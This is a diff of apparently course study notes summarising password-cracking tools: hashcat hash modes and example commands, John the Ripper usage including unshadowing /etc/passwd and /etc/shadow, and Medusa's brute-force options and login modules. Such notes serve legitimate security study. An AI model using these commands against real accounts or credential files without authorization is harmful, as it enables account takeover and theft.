+| 1800  | sha512crypt $6$, SHA512 (Unix)                   | Operating System                      |
+| 13800 | Windows Phone 8+ PIN/password                    | Operating System                      |
+| 2410  | Cisco-ASA MD5                                    | Operating System                      |
+| 9200  | Cisco-IOS $8$ (PBKDF2-SHA256)                    | Operating System                      |
+| 9300  | Cisco-IOS $9$ (scrypt)                           | Operating System                      |
+| 5700  | Cisco-IOS type 4 (SHA256)                        | Operating System                      |
+| 2400  | Cisco-PIX MD5                                    | Operating System                      |
+| 8100  | Citrix NetScaler (SHA1)                          | Operating System                      |
+| 22200 | Citrix NetScaler (SHA512)                        | Operating System                      |
+| 1100  | Domain Cached Credentials (DCC), MS Cache        | Operating System                      |
+| 2100  | Domain Cached Credentials 2 (DCC2), MS Cache 2   | Operating System                      |
+| 7000  | FortiGate (FortiOS)                              | Operating System                      |
+| 125   | ArubaOS                                          | Operating System                      |
+| 501   | Juniper IVE                                      | Operating System                      |
+| 22    | Juniper NetScreen/SSG (ScreenOS)                 | Operating System                      |
+| 15100 | Juniper/NetBSD sha1crypt                         | Operating System                      |
+| 131   | MSSQL (2000)                                     | Database Server                       |
+| 132   | MSSQL (2005)                                     | Database Server                       |
+| 1731  | MSSQL (2012, 2014)                               | Database Server                       |
+| 12    | PostgreSQL                                       | Database Server                       |
+| 3100  | Oracle H: Type (Oracle 7+)                       | Database Server                       |
+| 112   | Oracle S: Type (Oracle 11+)                      | Database Server                       |
+| 12300 | Oracle T: Type (Oracle 12+)                      | Database Server                       |
+| 7401  | MySQL $A$ (sha256crypt)                          | Database Server                       |
+| 200   | MySQL323                                         | Database Server                       |
+| 300   | MySQL4.1/MySQL5                                  | Database Server                       |
+| 8000  | Sybase ASE                                       | Database Server                       |
+| 1421  | hMailServer                                      | FTP, HTTP, SMTP, LDAP Server          |
+| 8300  | DNSSEC (NSEC3)                                   | FTP, HTTP, SMTP, LDAP Server          |
+| 16400 | CRAM-MD5 Dovecot                                 | FTP, HTTP, SMTP, LDAP Server          |
+| 1411  | SSHA-256(Base64), LDAP {SSHA256}                 | FTP, HTTP, SMTP, LDAP Server          |
+| 1711  | SSHA-512(Base64), LDAP {SSHA512}                 | FTP, HTTP, SMTP, LDAP Server          |
+| 10901 | RedHat 389-DS LDAP (PBKDF2-HMAC-SHA256)          | FTP, HTTP, SMTP, LDAP Server          |
+| 15000 | FileZilla Server >= 0.9.55                       | FTP, HTTP, SMTP, LDAP Server          |
+| 12600 | ColdFusion 10+                                   | FTP, HTTP, SMTP, LDAP Server          |
+| 1600  | Apache $apr1$ MD5, md5apr1, MD5 (APR)            | FTP, HTTP, SMTP, LDAP Server          |
+| 141   | Episerver 6.x < .NET 4                           | FTP, HTTP, SMTP, LDAP Server          |
+| 1441  | Episerver 6.x >= .NET 4                          | FTP, HTTP, SMTP, LDAP Server          |
+| 101   | nsldap, SHA-1(Base64), Netscape LDAP SHA         | FTP, HTTP, SMTP, LDAP Server          |
+| 111   | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA      | FTP, HTTP, SMTP, LDAP Server          |
+| 7700  | SAP CODVN B (BCODE)                              | Enterprise Application Software (EAS) |
+| 7701  | SAP CODVN B (BCODE) from RFC_READ_TABLE          | Enterprise Application Software (EAS) |
+| 7800  | SAP CODVN F/G (PASSCODE)                         | Enterprise Application Software (EAS) |
+| 7801  | SAP CODVN F/G (PASSCODE) from RFC_READ_TABLE     | Enterprise Application Software (EAS) |
+| 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1              | Enterprise Application Software (EAS) |
+| 133   | PeopleSoft                                       | Enterprise Application Software (EAS) |
+| 13500 | PeopleSoft PS_TOKEN                              | Enterprise Application Software (EAS) |
+| 21500 | SolarWinds Orion                                 | Enterprise Application Software (EAS) |
+| 8600  | Lotus Notes/Domino 5                             | Enterprise Application Software (EAS) |
+| 8700  | Lotus Notes/Domino 6                             | Enterprise Application Software (EAS) |
+| 9100  | Lotus Notes/Domino 8                             | Enterprise Application Software (EAS) |
+| 20600 | Oracle Transportation Management (SHA256)        | Enterprise Application Software (EAS) |
+| 4711  | Huawei sha1(md5($pass).$salt)                    | Enterprise Application Software (EAS) |
+| 20711 | AuthMe sha256                                    | Enterprise Application Software (EAS) |
+| 12200 | eCryptfs                                         | Full-Disk Encryption (FDE)            |
+| 22400 | AES Crypt (SHA256)                               | Full-Disk Encryption (FDE)            |
+| 14600 | LUKS                                             | Full-Disk Encryption (FDE)            |
+| 13711 | VeraCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)            |
+| 13712 | VeraCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)            |
+| 13713 | VeraCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)            |
+| 13741 | VeraCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)            |
+| 13742 | VeraCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)            |
+| 13743 | VeraCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)            |
+| 13751 | VeraCrypt SHA256 + XTS 512 bit                   | Full-Disk Encryption (FDE)            |
+| 13752 | VeraCrypt SHA256 + XTS 1024 bit                  | Full-Disk Encryption (FDE)            |
+| 13753 | VeraCrypt SHA256 + XTS 1536 bit                  | Full-Disk Encryption (FDE)            |
+| 13761 | VeraCrypt SHA256 + XTS 512 bit + boot-mode       | Full-Disk Encryption (FDE)            |
+| 13762 | VeraCrypt SHA256 + XTS 1024 bit + boot-mode      | Full-Disk Encryption (FDE)            |
+| 13763 | VeraCrypt SHA256 + XTS 1536 bit + boot-mode      | Full-Disk Encryption (FDE)            |
+| 13721 | VeraCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)            |
+| 13722 | VeraCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)            |
+| 13723 | VeraCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)            |
+| 13771 | VeraCrypt Streebog-512 + XTS 512 bit             | Full-Disk Encryption (FDE)            |
+| 13772 | VeraCrypt Streebog-512 + XTS 1024 bit            | Full-Disk Encryption (FDE)            |
+| 13773 | VeraCrypt Streebog-512 + XTS 1536 bit            | Full-Disk Encryption (FDE)            |
+| 13731 | VeraCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)            |
+| 13732 | VeraCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)            |
+| 13733 | VeraCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)            |
+| 16700 | FileVault 2                                      | Full-Disk Encryption (FDE)            |
+| 20011 | DiskCryptor SHA512 + XTS 512 bit                 | Full-Disk Encryption (FDE)            |
+| 20012 | DiskCryptor SHA512 + XTS 1024 bit                | Full-Disk Encryption (FDE)            |
+| 20013 | DiskCryptor SHA512 + XTS 1536 bit                | Full-Disk Encryption (FDE)            |
+| 22100 | BitLocker                                        | Full-Disk Encryption (FDE)            |
+| 12900 | Android FDE (Samsung DEK)                        | Full-Disk Encryption (FDE)            |
+| 8800  | Android FDE <= 4.3                               | Full-Disk Encryption (FDE)            |
+| 18300 | Apple File System (APFS)                         | Full-Disk Encryption (FDE)            |
+| 6211  | TrueCrypt RIPEMD160 + XTS 512 bit                | Full-Disk Encryption (FDE)            |
+| 6212  | TrueCrypt RIPEMD160 + XTS 1024 bit               | Full-Disk Encryption (FDE)            |
+| 6213  | TrueCrypt RIPEMD160 + XTS 1536 bit               | Full-Disk Encryption (FDE)            |
+| 6241  | TrueCrypt RIPEMD160 + XTS 512 bit + boot-mode    | Full-Disk Encryption (FDE)            |
+| 6242  | TrueCrypt RIPEMD160 + XTS 1024 bit + boot-mode   | Full-Disk Encryption (FDE)            |
+| 6243  | TrueCrypt RIPEMD160 + XTS 1536 bit + boot-mode   | Full-Disk Encryption (FDE)            |
+| 6221  | TrueCrypt SHA512 + XTS 512 bit                   | Full-Disk Encryption (FDE)            |
+| 6222  | TrueCrypt SHA512 + XTS 1024 bit                  | Full-Disk Encryption (FDE)            |
+| 6223  | TrueCrypt SHA512 + XTS 1536 bit                  | Full-Disk Encryption (FDE)            |
+| 6231  | TrueCrypt Whirlpool + XTS 512 bit                | Full-Disk Encryption (FDE)            |
+| 6232  | TrueCrypt Whirlpool + XTS 1024 bit               | Full-Disk Encryption (FDE)            |
+| 6233  | TrueCrypt Whirlpool + XTS 1536 bit               | Full-Disk Encryption (FDE)            |
+| 10400 | PDF 1.1 - 1.3 (Acrobat 2 - 4)                    | Documents                             |
+| 10410 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #1       | Documents                             |
+| 10420 | PDF 1.1 - 1.3 (Acrobat 2 - 4), collider #2       | Documents                             |
+| 10500 | PDF 1.4 - 1.6 (Acrobat 5 - 8)                    | Documents                             |
+| 10600 | PDF 1.7 Level 3 (Acrobat 9)                      | Documents                             |
+| 10700 | PDF 1.7 Level 8 (Acrobat 10 - 11)                | Documents                             |
+| 9400  | MS Office 2007                                   | Documents                             |
+| 9500  | MS Office 2010                                   | Documents                             |
+| 9600  | MS Office 2013                                   | Documents                             |
+| 9700  | MS Office <= 2003 $0/$1, MD5 + RC4               | Documents                             |
+| 9710  | MS Office <= 2003 $0/$1, MD5 + RC4, collider #1  | Documents                             |
+| 9720  | MS Office <= 2003 $0/$1, MD5 + RC4, collider #2  | Documents                             |
+| 9800  | MS Office <= 2003 $3/$4, SHA1 + RC4              | Documents                             |
+| 9810  | MS Office <= 2003 $3, SHA1 + RC4, collider #1    | Documents                             |
+| 9820  | MS Office <= 2003 $3, SHA1 + RC4, collider #2    | Documents                             |
+| 18400 | Open Document Format (ODF) 1.2 (SHA-256, AES)    | Documents                             |
+| 18600 | Open Document Format (ODF) 1.1 (SHA-1, Blowfish) | Documents                             |
+| 16200 | Apple Secure Notes                               | Documents                             |
+| 15500 | JKS Java Key Store Private Keys (SHA1)           | Password Managers                     |
+| 6600  | 1Password, agilekeychain                         | Password Managers                     |
+| 8200  | 1Password, cloudkeychain                         | Password Managers                     |
+| 9000  | Password Safe v2                                 | Password Managers                     |
+| 5200  | Password Safe v3                                 | Password Managers                     |
+| 6800  | LastPass + LastPass sniffed                      | Password Managers                     |
+| 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)      | Password Managers                     |
+| 11300 | Bitcoin/Litecoin wallet.dat                      | Password Managers                     |
+| 16600 | Electrum Wallet (Salt-Type 1-3)                  | Password Managers                     |
+| 21700 | Electrum Wallet (Salt-Type 4)                    | Password Managers                     |
+| 21800 | Electrum Wallet (Salt-Type 5)                    | Password Managers                     |
+| 12700 | Blockchain, My Wallet                            | Password Managers                     |
+| 15200 | Blockchain, My Wallet, V2                        | Password Managers                     |
+| 18800 | Blockchain, My Wallet, Second Password (SHA256)  | Password Managers                     |
+| 23100 | Apple Keychain                                   | Password Managers                     |
+| 16300 | Ethereum Pre-Sale Wallet, PBKDF2-HMAC-SHA256     | Password Managers                     |
+| 15600 | Ethereum Wallet, PBKDF2-HMAC-SHA256              | Password Managers                     |
+| 15700 | Ethereum Wallet, SCRYPT                          | Password Managers                     |
+| 22500 | MultiBit Classic .key (MD5)                      | Password Managers                     |
+| 22700 | MultiBit HD (scrypt)                             | Password Managers                     |
+| 11600 | 7-Zip                                            | Archives                              |
+| 12500 | RAR3-hp                                          | Archives                              |
+| 13000 | RAR5                                             | Archives                              |
+| 17200 | PKZIP (Compressed)                               | Archives                              |
+| 17220 | PKZIP (Compressed Multi-File)                    | Archives                              |
+| 17225 | PKZIP (Mixed Multi-File)                         | Archives                              |
+| 17230 | PKZIP (Mixed Multi-File Checksum-Only)           | Archives                              |
+| 17210 | PKZIP (Uncompressed)                             | Archives                              |
+| 20500 | PKZIP Master Key                                 | Archives                              |
+| 20510 | PKZIP Master Key (6 byte optimization)           | Archives                              |
+| 14700 | iTunes backup < 10.0                             | Archives                              |
+| 14800 | iTunes backup >= 10.0                            | Archives                              |
+| 23001 | SecureZIP AES-128                                | Archives                              |
+| 23002 | SecureZIP AES-192                                | Archives                              |
+| 23003 | SecureZIP AES-256                                | Archives                              |
+| 13600 | WinZip                                           | Archives                              |
+| 18900 | Android Backup                                   | Archives                              |
+| 13200 | AxCrypt                                          | Archives                              |
+| 13300 | AxCrypt in-memory SHA1                           | Archives                              |
+| 8400  | WBB3 (Woltlab Burning Board)                     | Forums, CMS, E-Commerce               |
+| 2611  | vBulletin < v3.8.5                               | Forums, CMS, E-Commerce               |
+| 2711  | vBulletin >= v3.8.5                              | Forums, CMS, E-Commerce               |
+| 2612  | PHPS                                             | Forums, CMS, E-Commerce               |
+| 121   | SMF (Simple Machines Forum) > v1.1               | Forums, CMS, E-Commerce               |
+| 3711  | MediaWiki B type                                 | Forums, CMS, E-Commerce               |
+| 4521  | Redmine                                          | Forums, CMS, E-Commerce               |
+| 11    | Joomla < 2.5.18                                  | Forums, CMS, E-Commerce               |
+| 13900 | OpenCart                                         | Forums, CMS, E-Commerce               |
+| 11000 | PrestaShop                                       | Forums, CMS, E-Commerce               |
+| 16000 | Tripcode                                         | Forums, CMS, E-Commerce               |
+| 7900  | Drupal7                                          | Forums, CMS, E-Commerce               |
+| 21    | osCommerce, xt:Commerce                          | Forums, CMS, E-Commerce               |
+| 4522  | PunBB                                            | Forums, CMS, E-Commerce               |
+| 2811  | MyBB 1.2+, IPB2+ (Invision Power Board)          | Forums, CMS, E-Commerce               |
+| 18100 | TOTP (HMAC-SHA1)                                 | One-Time Passwords                    |
+| 2000  | STDOUT                                           | Plaintext                             |
+| 99999 | Plaintext                                        | Plaintext                             |
+| 21600 | Web2py pbkdf2-sha512                             | Framework                             |
+| 10000 | Django (PBKDF2-SHA256)                           | Framework                             |
+| 124   | Django (SHA-1)                                   | Framework                             |
+
+### Brain Client Features
+
+| # | Features |
+| ---- | ---- |
+|  1 | Send hashed passwords|
+|  2 | Send attack positions|
+|  3 | Send hashed passwords and attack positions|
+
+### Outfile Formats
+
+ | # | Format|
+| ---- | ---- |
+|  1 | hash[:salt]|
+|  2 | plain|
+|  3 | hex_plain|
+|  4 | crack_pos|
+|  5 | timestamp absolute|
+|  6 | timestamp relative|
+
+### Rule Debugging Modes
+
+ | # | Format|
+ | ---- | ---- |
+|  1 | Finding-Rule|
+|  2 | Original-Word|
+|  3 | Original-Word:Finding-Rule|
+|  4 | Original-Word:Finding-Rule:Processed-Word|
+
+### Attack Modes
+
+ | # | Mode|
+ | ---- | ---- |
+|  0 | Straight|
+|  1 | Combination|
+|  3 | Brute-force|
+|  6 | Hybrid Wordlist + Mask|
+|  7 | Hybrid Mask + Wordlist|
+
+### Built-in Charsets 
+
+ | ? | Charset|
+ | ---- |----|
+|  l | abcdefghijklmnopqrstuvwxyz|
+|  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ|
+|  d | 0123456789|
+|  h | 0123456789abcdef|
+|  H | 0123456789ABCDEF|
+|  s | !"#$%&'()\*+,-./:;<=>?@\[\\]^\_\`{\|}~|
+|  a | ?l?u?d?s|
+|  b | 0x00 - 0xff|
+
+### OpenCL Device Types
+
+ | # | Device Type|
+ | ---- | ---- |
+|  1 | CPU|
+|  2 | GPU|
+|  3 | FPGA, DSP, Co-Processor|
+
+### Workload Profiles
+
+ | # | Performance | Runtime | Power Consumption | Desktop Impact|
+ | ---- | ---- |
+|  1 | Low         |   2 ms  | Low               | Minimal|
+|  2 | Default     |  12 ms  | Economic          | Noticeable|
+|  3 | High        |  96 ms  | High              | Unresponsive|
+|  4 | Nightmare   | 480 ms  | Insane            | Headless|
+
+### Basic Examples
+
+| Attack- Mode | Hash- Type | Example command|
+| ---- | ---- | ---- |
+|  Wordlist         | $P$   | hashcat -a 0 -m 400 example400.hash example.dict|
+|  Wordlist + Rules | MD5   | hashcat -a 0 -m 0 example0.hash example.dict -r rules/best64.rule|
+|  Brute-Force      | MD5   | hashcat -a 3 -m 0 example0.hash ?a?a?a?a?a?a|
+|  Combinator       | MD5   | hashcat -a 1 -m 0 example0.hash example.dict example.dict|
+
+
+
+## John the Ripper
+
+Password cracker. Can also generate custom wordlists & apply rule permutations.  
+**Speed is limited to the power of the CPUs dedicated to the task.  
+  
+Config file: /etc/john/john.conf  
+  
+To mutate a wordlist, navigate to **\[List.Rules:Wordlist]** segment, add section for your own rules ( **\[List.Rules:myrules]**)
+  
+  
+Create hash file from .zip or .rar:  
+```bash
+zip2john flag.zip  
+rar2john flag.rar
+```
+
+**NOTE:**  Hash syntax requirements:
+	\<user>:\<hash>
+
+Usage:  
+```bash
+john [ OPTIONS ] [ PASSWORD-FILES ]
+```
+
+
+Brute forcing:  
+	Supply pw file (& hopefully format).  
+	Can take a long time  
+  
+Wordlist:  
+	**--wordlist**  
+	Faster, but less coverage.  
+  
+Word mangling:  
+	**--rules**  
+	Recommend if any pw left after BF & Wordlist are exhausted.  
+  
+  
+Linux:  
+	Need to combine _/etc/passwd_ & _/etc/shadow_ fies w/ **unshadow**  
+```bash
+unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
+```
+
+ 
+**--fork** & **--node** ex:  
+- Assuming two machines, each with an 8-core CPU.  
+	- 1st machine - **--fork=8** & **--node=1-8/16**:  
+		- Creates eight processes on this machine  
+		- Splits the supplied wordlist into sixteen equal parts  
+		- Process the first eight parts locally.  
+	- 2nd machine - **--fork=8** & **--node=9-16**:  
+		- Assigns eight processes to the 2nd half of the wordlist.  
+
+| Options                                   | Desc                                                                                                  |
+| ----------------------------------------- | ----------------------------------------------------------------------------------------------------- |
+| --help                                    | Print usage summary                                                                                   |
+| --single\[=SECTION\[,..\]\]               | "Single crack" mode, using default or named rules                                                     |
+| --single=:rule\[,..\]                     | Same, using "immediate" rule(s)                                                                       |
+| --single-seed=WORD\[,WORD\]               | Add static seed word(s) for all salts in single mode                                                  |
+| --single-wordlist=FILE                    | *Short* wordlist with static seed words/morphemes                                                     |
+| --single-user-seed=FILE                   | Wordlist with seeds per username (user:password\[s\] format)                                          |
+| --single-pair-max=N                       | Override max. number of word pairs generated (6)                                                      |
+| --no-single-pair                          | Disable single word pair generation                                                                   |
+| --\[no-\]single-retest-guess              | Override config for SingleRetestGuess                                                                 |
+| --wordlist\[=FILE\] --stdin               | Wordlist mode, read words from FILE or stdin                                                          |
+| &nbsp;&nbsp;&nbsp;--pipe                  | like --stdin, but bulk reads, and allows rules                                                        |
+|                                           |                                                                                                       |
+| --rules\[=SECTION\[,..\]\]                | Enable word mangling rules (for wordlist or PRINCE modes), using default or named rules               |
+| --rules=:rule\[;..\]\]                    | Same, using "immediate" rule(s)                                                                       |
+| --rules-stack=SECTION\[,..\]              | Stacked rules, applied after regular rules or to modes that otherwise don't support rules             |
+| --rules-stack=:rule\[;..\]                | Same, using "immediate" rule(s)                                                                       |
+| --rules-skip-nop                          | Skip any NOP ":" rules (you already ran w/o rules)                                                    |
+|                                           |                                                                                                       |
+| --loopback\[=FILE\]                       | Like --wordlist, but extract words from a .pot file                                                   |
+| --mem-file-size=SIZE                      | Size threshold for wordlist preload (default 2048 MB)                                                 |
+| --dupe-suppression                        | Suppress all dupes in wordlist (and force preload)                                                    |
+| --incremental\[=MODE\]                    | "Incremental" mode \[using section MODE\]                                                             |
+| --incremental-charcount=N                 | Override CharCount for incremental mode                                                               |
+| --external=MODE                           | External mode or word filter                                                                          |
+| --mask\[=MASK\]                           | Mask mode using MASK (or default from john.conf)                                                      |
+| --markov\[=OPTIONS\]                      | "Markov" mode (see doc/MARKOV)                                                                        |
+| --mkv-stats=FILE                          | "Markov" stats file                                                                                   |
+|                                           |                                                                                                       |
+| --prince\[=FILE\]                         | PRINCE mode, read words from FILE                                                                     |
+| --prince-loopback\[=FILE\]                | Fetch words from a .pot file                                                                          |
+| --prince-elem-cnt-min=N                   | Minimum number of elements per chain (1)                                                              |
+| --prince-elem-cnt-max=\[-\]N              | Maximum number of elements per chain (negative N is relative to word length) (8)                      |
+| --prince-skip=N                           | Initial skip                                                                                          |
+| --prince-limit=N                          | Limit number of candidates generated                                                                  |
+| --prince-wl-dist-len                      | Calculate length distribution from wordlist                                                           |
+| --prince-wl-max=N                         | Load only N words from input wordlist                                                                 |
+| --prince-case-permute                     | Permute case of first letter                                                                          |
+| --prince-mmap                             | Memory-map infile (not available with case permute)                                                   |
+| --prince-keyspace                         | Just show total keyspace that would be produced (disregarding skip and limit)                         |
+|                                           |                                                                                                       |
+| --subsets\[=CHARSET\]                     | "Subsets" mode (see doc/SUBSETS)                                                                      |
+| --subsets-required=N                      | The N first characters of "subsets" charset are The "required set"                                    |
+| --subsets-min-diff=N                      | Minimum unique characters in subset                                                                   |
+| --subsets-max-diff=\[-\]N                 | Maximum unique characters in subset (negative N is relative to word length)                           |
+| --subsets-prefer-short                    | Prefer shorter candidates over smaller subsets                                                        |
+| --subsets-prefer-small                    | Prefer smaller subsets over shorter candidates                                                        |
+|                                           |                                                                                                       |
+| --make-charset=FILE                       | Make a charset, FILE will be overwritten                                                              |
+| --stdout\[=LENGTH\]                       | Just output candidate passwords \[cut at LENGTH\]                                                     |
+| --session=NAME                            | Give a new session the NAME                                                                           |
+| --status\[=NAME\]                         | Print status of a session \[called NAME\]                                                             |
+| --restore\[=NAME\]                        | Restore an interrupted session \[called NAME\]                                                        |
+| --\[no-\]crack-status                     | Emit a status line whenever a password is cracked                                                     |
+| --progress-every=N                        | Emit a status line every N seconds                                                                    |
+|                                           |                                                                                                       |
+| --show\[=left\]                           | Show cracked passwords \[if =left, then uncracked\]                                                   |
+| --show=formats                            | Show information about hashes in a file (JSON)                                                        |
+| --show=invalid                            | Show lines that are not valid for selected format(s)                                                  |
+| --test\[=TIME\]                           | Run tests and benchmarks for TIME seconds each (if TIME is explicitly 0, test w/o benchmark)          |
+| --stress-test\[=TIME\]                    | Loop self tests forever                                                                               |
+| --test-full=LEVEL                         | Run more thorough self-tests                                                                          |
+|                                           |                                                                                                       |
+| --no-mask                                 | Used with --test for alternate benchmark w/o mask                                                     |
+| --skip-self-tests                         | Skip self tests                                                                                       |
+| --users=\[-\]LOGIN\|UID\[,..\] \[Do not\] | load this (these) user(s) only                                                                        |
+| --groups=\[-\]GID\[,..\]                  | Load users \[not\] of this (these) group(s) only                                                      |
+| --shells=\[-\]SHELL\[,..\]                | Load users with\[out\] this (these) shell(s) only                                                     |
+|                                           |                                                                                                       |
+| --salts=\[-\]COUNT\[:MAX\]                | Load salts with\[out\] COUNT \[to MAX\] hashes, or                                                    |
+| --salts=#M\[-N\]                          | Load M \[to N\] most populated salts                                                                  |
+| --costs=\[-]\C\[:M\]\[,...\]              | Load salts with\[out\] cost value Cn\[to Mn\]. For tunable cost parameters, see doc/OPTIONS           |
+| --fork=N                                  | Fork N processes                                                                                      |
+| --node=MIN\[-MAX\]/TOTAL                  | This node's number range out of TOTAL count**                                                         |
+|                                           |                                                                                                       |
+| --save-memory=LEVEL                       | Enable memory saving, at LEVEL 1..3                                                                   |
+| --log-stderr                              | Log to screen instead of file                                                                         |
+| --verbosity=N                             | Change verbosity (1-5 or 6 for debug, default 3)                                                      |
+| --no-log                                  | Disables creation and writing to john.log file                                                        |
+| --bare-always-valid=Y                     | Treat bare hashes as valid (Y/N)                                                                      |
+|                                           |                                                                                                       |
+| --catch-up=NAME                           | Catch up with existing (paused) session NAME                                                          |
+| --config=FILE                             | Use FILE instead of john.conf or john.ini                                                             |
+| --encoding=NAME                           | Input encoding (eg. UTF-8, ISO-8859-1). See also doc/ENCODINGS.                                       |
+| --input-encoding=NAME                     | Input encoding (alias for --encoding)                                                                 |
+| --internal-codepage=NAME                  | Codepage used in rules/masks (see doc/ENCODINGS)                                                      |
+| --target-encoding=NAME                    | Output encoding (used by format)                                                                      |
+|                                           |                                                                                                       |
+| --force-tty                               | Set up terminal for reading keystrokes even if we're not the foreground process                       |
+| --field-separator-char=C                  | Use 'C' instead of the ':' in input and pot files                                                     |
+| --\[no-\]keep-guessing                    | Try finding plaintext collisions                                                                      |
+| --list=WHAT                               | List capabilities, see --list=help or doc/OPTIONS                                                     |
+|                                           |                                                                                                       |
+| --length=N                                | Shortcut for --min-len=N --max-len=N                                                                  |
+| --min-length=N                            | Request a minimum candidate length in bytes                                                           |
+| --max-length=N                            | Request a maximum candidate length in bytes                                                           |
+| --max-candidates=\[-\]N                   | Gracefully exit after this many candidates tried. (if negative, reset count on each crack)            |
+| --max-run-time=\[-\]N                     | Gracefully exit after this many seconds (if negative, reset timer on each crack)                      |
+|                                           |                                                                                                       |
+| --mkpc=N                                  | Request a lower max. keys per crypt                                                                   |
+| --no-loader-dupecheck                     | Disable the dupe checking when loading hashes                                                         |
+| --pot=NAME                                | Pot file to use                                                                                       |
+| --regen-lost-salts=N                      | Brute force unknown salts (see doc/OPTIONS)                                                           |
+| --reject-printable                        | Reject printable binaries                                                                             |
+| --tune=HOW                                | Tuning options (auto/report/N)                                                                        |
+| --subformat=FORMAT                        | Pick a benchmark format for --format=crypt                                                            |
+| --format=\[NAME\|CLASS\]\[,..\]           | Force hash of type NAME. The supported formats can be seen with --list=formats and --list=subformats. |
+\*See also doc/OPTIONS for more advanced selection of format(s), including using classes and wildcards.
+
+## Removed from course
+
+### Medusa
+
+“Speedy, massively parallel, modular, login brute forcer”  
+  
+Usage:
+```bash
+Medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPT]
+```
+
+| Options           | Desc                                                                                                                                                                             |
+| ----------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **-h** \[TEXT\]   | Target hostname or IP address                                                                                                                                                    |
+| **-H** \[FILE\]   | File containing target hostnames or IP addresses                                                                                                                                 |
+| **-u** \[TEXT\]   | Username to test                                                                                                                                                                 |
+| **-U** \[FILE\]   | File containing usernames to test                                                                                                                                                |
+| **-p** \[TEXT\]   | Password to test                                                                                                                                                                 |
+| **-P** \[FILE\]   | File containing passwords to test                                                                                                                                                |
+| **-C** \[FILE\]   | File containing combo entries. See README for more information.                                                                                                                  |
+| **-O** \[FILE\]   | File to append log information to                                                                                                                                                |
+| **-e** \[n/s/ns\] | Additional password checks (\[n\] No Password, \[s\] Password = Username)                                                                                                        |
+| **-M** \[TEXT\]   | Name of the module to execute (without the .mod extension)                                                                                                                       |
+| **-m** \[TEXT\]   | Parameter to pass to the module. This can be passed multiple times with a different parameter each time and they will all be sent to the module (i.e. -m Param1 -m Param2, etc.) |
+| **-d**            | Dump all known modules                                                                                                                                                           |
+| **-n** \[NUM\]    | Use for non-default TCP port number                                                                                                                                              |
+| **-s**            | Enable SSL                                                                                                                                                                       |
+| **-g** \[NUM\]    | Give up after trying to connect for NUM seconds (default 3)                                                                                                                      |
+| **-r** \[NUM\]    | Sleep NUM seconds between retry attempts (default 3)                                                                                                                             |
+| **-R** \[NUM\]    | Attempt NUM retries before giving up. The total number of attempts will be NUM + 1.                                                                                              |
+| **-c** \[NUM\]    | Time to wait in usec to verify socket is available (default 500 usec).                                                                                                           |
+| **-t** \[NUM\]    | Total number of logins to be tested concurrently                                                                                                                                 |
+| **-T** \[NUM\]    | Total number of hosts to be tested concurrently                                                                                                                                  |
+| **-L**            | Parallelize logins using one username per thread. The default is to process the entire username before proceeding.                                                               |
+| **-f**            | Stop scanning host after first valid username/password found.                                                                                                                    |
+| **-F**            | Stop audit after first valid username/password found on any host.                                                                                                                |
+| **-b**            | Suppress startup banner                                                                                                                                                          |
+| **-q**            | Display module's usage information                                                                                                                                               |
+| **-v** \[NUM\]    | Verbose level \[0 - 6 (more)\]                                                                                                                                                   |
+| **-w** \[NUM\]    | Error debug level \[0 - 10 (more)\]                                                                                                                                              |
+| **-V**            | Display version                                                                                                                                                                  |
+| **-Z** \[TEXT\]   | Resume scan based on map of previous scan                                                                                                                                        |
+|                   |                                                                                                                                                                                  |
+| Modules           | Available modules in "_/usr/lib/x86_64-linux-gnu/medusa/modules_"                                                                                                                |
+| cvs.mod           | Brute force module for CVS sessions : version 2.0                                                                                                                                |
+| ftp.mod           | Brute force module for FTP/FTPS sessions : version 2.1                                                                                                                           |
+| http.mod          | Brute force module for HTTP : version 2.1                                                                                                                                        |
+| imap.mod          | Brute force module for IMAP sessions : version 2.0                                                                                                                               |
+| mssql.mod         | Brute force module for M$-SQL sessions : version 2.0                                                                                                                             |
+| mysql.mod         | Brute force module for MySQL sessions : version 2.0                                                                                                                              |
+| nntp.mod          | Brute force module for NNTP sessions : version 2.0                                                                                                                               |
+| pcanywhere.mod    | Brute force module for PcAnywhere sessions : version 2.0                                                                                                                         |
+| pop3.mod          | Brute force module for POP3 sessions : version 2.0                                                                                                                               |
+| postgres.mod      | Brute force module for PostgreSQL sessions : version 2.0                                                                                                                         |
+| rexec.mod         | Brute force module for REXEC sessions : version 2.0                                                                                                                              |
+| rlogin.mod        | Brute force module for RLOGIN sessions : version 2.0                                                                                                                             |
+| rsh.mod           | Brute force module for RSH sessions : version 2.0                                                                                                                                |
+| smbnt.mod         | Brute force module for SMB (LM/NTLM/LMv2/NTLMv2) sessions : version 2.1                                                                                                          |
+| smtp-vrfy.mod     | Brute force module for verifying SMTP accounts (VRFY/EXPN/RCPT TO) : version 2.1                                                                                                 |
+| smtp.mod          | Brute force module for SMTP Authentication with TLS : version 2.0                                                                                                                |
+| snmp.mod          | Brute force module for SNMP Community Strings : version 2.1                                                                                                                      |
+| ssh.mod           | Brute force module for SSH v2 sessions : version 2.1                                                                                                                             |
+| svn.mod           | Brute force module for Subversion sessions : version 2.1                                                                                                                         |
+| telnet.mod        | Brute force module for telnet sessions : version 2.0                                                                                                                             |
+| vmauthd.mod       | Brute force module for the VMware Authentication Daemon : version 2.0                                                                                                            |
